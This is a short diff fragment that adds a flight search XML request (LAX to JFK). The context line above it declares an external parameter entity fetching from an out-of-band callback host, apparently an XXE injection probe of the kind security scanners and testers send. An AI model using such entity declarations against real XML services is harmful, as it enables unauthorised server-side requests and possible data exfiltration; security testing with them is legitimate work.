@@ -1,1 +1,9 @@
 <!ENTITY % remote SYSTEM "https://duirsayztkhgyprnwbwfkxs530hurammd.oast.fun">
+<request>
+  <query>
+    <market>US</market>
+    <locale>en-US</locale>
+    <origin>LAX</origin>
+    <destination>JFK</destination>
+  </query>
+</request>
